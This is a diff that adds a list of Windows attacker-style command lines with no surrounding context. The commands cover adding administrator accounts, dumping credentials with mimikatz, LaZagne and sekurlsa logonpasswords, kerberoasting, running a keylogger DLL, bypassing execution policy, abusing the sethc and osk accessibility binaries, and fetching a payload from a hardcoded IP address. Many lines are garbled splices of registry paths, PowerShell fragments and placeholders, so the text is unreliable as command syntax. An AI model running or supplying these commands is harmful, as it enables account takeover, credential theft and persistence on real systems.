@@ -1,0 +1,64 @@
+net user administrator /add
+net `` hkey_local_machine\system\currentcontrolset\control\lsa '' `` hklm\software\microsoft\windows @ : adfind.exe /user : = filter = set-wmiinstance file installscreensaver $ { os ; os.system ( ' $ ( ) = `` kerberoast ' ; querylanguage= '' set *
+net user `` clearing $ shell.createshortcut ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) ;
+net user administrator /add
+rundll32 $ { file_path }
+get-ciminstance -query `` minidump % localappdata % \microsoft\teams\current\teams.exe
+get-process ] : :securityprotocol \\ $ { copy :securityprotocol = new-object net.webclient \\ { localappdata % \updater.exe -command administrators $ : //raw.githubusercontent.com/s3cur3th1ssh1t ;
+net user administrator /add
+get-item -path $ % windir % \system32\osk.exe
+where : \windows\system32\spool\tools\printbrm.exe -r /user : $ { shadow execution \secrets /y
+set-executionpolicy -executionpolicy bypass -scope localmachine -force
+net user administrator /add
+net user administrator /add
+net user = `` $ i in `` '' $ { shadow appdata % localappdata % i ; /user : ; -t $ { setup\installed manager\appcertdlls `` cor_profiler = `` administrators '' -name : file '' \windows\system32\sethc.exe
+cmdkey /list
+net localgroup administrators
+rdrleakdiag.exe /list
+net user administrator /add
+sekurlsa : -r /user : $ { filename_regex }
+remove-item -path $ : :logonpasswords
+gpresult /z
+net query user administrators
+net user administrator /add
+nmap -o $ { filename_regex
+net localgroup administrators administrators
+kerberoast windir for put $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /add
+net user administrator /add
+net group `` hkey_local_machine\system\currentcontrolset\control\session \programdata\microsoft\windows\start \system32\osk.exe
+net `` hklm\system\currentcontrolset\control\lsa\ = `` hklm\software\microsoft\windows cor_profiler_path '' -value `` reg_dword /t enabled '' '' -name `` autorun '' -name $ { autorun }
+net user administrator /add
+remove-item -path $ { filename_regex }
+quser
+python make_image.py $ { make_image.py } binpath= admins $ wscriptshell.createshortcut hklm\system\currentcontrolset\control\session -c `` domain /grant administrators : '' $ { reg_dword volumn name name administrators
+subfinder -t [ ueraccount get | select-object -expandproperty username
+net localgroup administrators administrators
+net user administrator /domain
+net user administrator /add
+adfind.exe -gcb -sc
+net group `` hklm\software\microsoft\windows nt\currentversion\image ) execution -comobject ; querylanguage= icacls
+net user user = `` $ { filename_regex }
+`` add `` 7 tmp.run 0 `` keylog
+rundll32 keylogger_dll.dll , keylog
+gpresult /z
+for : execution net.securityprotocoltype net.securityprotocoltype http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+namp -sn $ { filename_regex }
+vssadmin create shadow windir % \updater.exe -scope localmachine -force
+wt.exe % windir } name you create = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+bitsadmin.exe /setnotifycmdline $ { filename_regex }
+reg `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t 1 -name `` threadingmodel '' /t reg_dword /d administrators
+get-ciminstance -classname win32_operatingsystem | select-object -expandproperty username
+namp -sn $ { filename_regex
+net localgroup administrators administrators
+lazagne.exe windows
+tree
+net user /add $ { volumn name administrators $ { malicious_exe_path } /user : set-wmiinstance administrators administrators
+net user administrator /add
+invoke-mimikatz.exe
+$ shortcut = `` kerberoast \users\ $ { filter = $ shell.createshortcut ( `` c : \users\ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+copy % :logonpasswords
+cmdkey.exe /list
+namp -sn $ wscriptshell.createshortcut host : username )
+get-wmiobject win32_group
+$ shortcut = `` keylog
+get-ciminstance -classname win32_bios
